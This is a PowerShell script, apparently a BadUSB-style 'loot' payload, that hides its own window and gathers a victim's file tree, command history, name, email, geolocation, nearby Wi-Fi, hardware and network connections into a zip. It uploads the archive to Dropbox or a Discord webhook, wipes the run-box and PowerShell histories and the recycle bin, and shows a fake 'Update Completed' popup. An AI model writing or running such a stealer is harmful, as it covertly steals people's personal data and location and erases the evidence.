############################################################################################################################################################
# OUTPUT RESULTS TO LOOT FILE
########################################################################################################################
# ███╗   ███╗██████╗    ███████╗██╗     ██╗██████╗ ██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗                  #
# ████╗ ████║██╔══██╗   ██╔════╝██║     ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║                #
# ██╔████╔██║██████╔╝   █████╗  ██║     ██║██████╔╝██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║                #
# ██║╚██╔╝██║██╔══██╗   ██╔══╝  ██║     ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║                #
# ██║ ╚═╝ ██║██║  ██║██╗██║     ███████╗██║██║     ██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║                #
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           #
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                          #
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                            #
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                           #
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                          #
#  \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                           #
#########################################################################################################################

# Hide the PowerShell window
Add-Type -Name Win32 -Namespace ShowWindowAPI -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
[ShowWindowAPI.Win32]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

# Create loot directory
$FolderName = "$env:USERNAME-LOOT-$(Get-Date -Format yyyy-MM-dd_HH-mm)"
$FileName = "$FolderName.txt"
$ZIP = "$FolderName.zip"
$LootDir = "$env:TEMP\$FolderName"
New-Item -Path $LootDir -ItemType Directory

# Collect system information
function Collect-SystemInfo {
    # Tree structure of user profile
    tree $Env:USERPROFILE /a /f > "$LootDir\tree.txt"

    # PowerShell command history
    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$LootDir\Powershell-History.txt"

    # Full username
    try {
        $FullName = (Get-LocalUser -Name $env:USERNAME).FullName
    } catch {
        $FullName = $env:USERNAME
    }
    $FullName | Out-File -Append "$LootDir\$FileName"

    # Email (Primary owner)
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    } catch {
        $email = "No Email Detected"
    }
    $email | Out-File -Append "$LootDir\$FileName"
}

# Collect geographic location
function Collect-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Host "Access Denied for Location Information"
        } else {
            $location = $GeoWatcher.Position.Location | Select-Object Latitude, Longitude
            $Lat = $location.Latitude
            $Lon = $location.Longitude
            "Latitude: $Lat, Longitude: $Lon" | Out-File -Append "$LootDir\$FileName"
        }
    } catch {
        Write-Host "Unable to obtain coordinates"
    }
}

# Collect nearby Wi-Fi information
function Collect-WiFiNetworks {
    try {
        $NearbyWiFi = (netsh wlan show networks mode=Bssid) | Select-String "SSID|Authentication|Encryption"
        $NearbyWiFi | Out-File -Append "$LootDir\$FileName"
    } catch {
        "No nearby Wi-Fi networks detected" | Out-File -Append "$LootDir\$FileName"
    }
}

# Collect system hardware details
function Collect-HardwareInfo {
    $SystemDetails = Get-CimInstance CIM_ComputerSystem | Format-List
    $SystemDetails | Out-File -Append "$LootDir\$FileName"
    
    # CPU details
    $CpuDetails = Get-WmiObject Win32_Processor | Format-List
    $CpuDetails | Out-File -Append "$LootDir\$FileName"
    
    # RAM details
    $RamDetails = Get-WmiObject Win32_PhysicalMemory | Format-List
    $RamDetails | Out-File -Append "$LootDir\$FileName"
    
    # BIOS details
    $BiosDetails = Get-CimInstance CIM_BIOSElement | Format-List
    $BiosDetails | Out-File -Append "$LootDir\$FileName"
}

# Collect active TCP connections
function Collect-TCPConnections {
    $TcpConnections = Get-NetTCPConnection | Format-Table -AutoSize
    $TcpConnections | Out-File -Append "$LootDir\$FileName"
}

# Main execution
Collect-SystemInfo
Collect-GeoLocation
Collect-WiFiNetworks
Collect-HardwareInfo
Collect-TCPConnections

# Compress collected loot
Compress-Archive -Path "$LootDir\*" -DestinationPath "$env:TEMP\$ZIP"

############################################################################################################################################################
# OUTPUT RESULTS TO LOOT FILE
########################################################################################################################
# ███╗   ███╗██████╗    ███████╗██╗     ██╗██████╗ ██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗                  #
# ████╗ ████║██╔══██╗   ██╔════╝██║     ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║                #
# ██╔████╔██║██████╔╝   █████╗  ██║     ██║██████╔╝██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║                #
# ██║╚██╔╝██║██╔══██╗   ██╔══╝  ██║     ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║                #
# ██║ ╚═╝ ██║██║  ██║██╗██║     ███████╗██║██║     ██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║                #
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           #
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                          #
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                            #
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                           #
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                          #
#  \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                           #
#########################################################################################################################

# Function to upload file to Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Upload data to Dropbox
if (-not ([string]::IsNullOrEmpty($db))) {
    DropBox-Upload -SourceFilePath "$env:TEMP\$ZIP"
}

# Function to upload data to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Upload data to Discord
if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file "$env:TEMP\$ZIP"
}

############################################################################################################################################################
# CLEANUP
########################################################################################################################

# Delete contents of Temp folder 
Remove-Item -Path "$env:TEMP\$FolderName" -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

############################################################################################################################################################
# Popup message to signal the payload is done
########################################################################################################################
$done = New-Object -ComObject Wscript.Shell
$done.Popup("Update Completed",1)
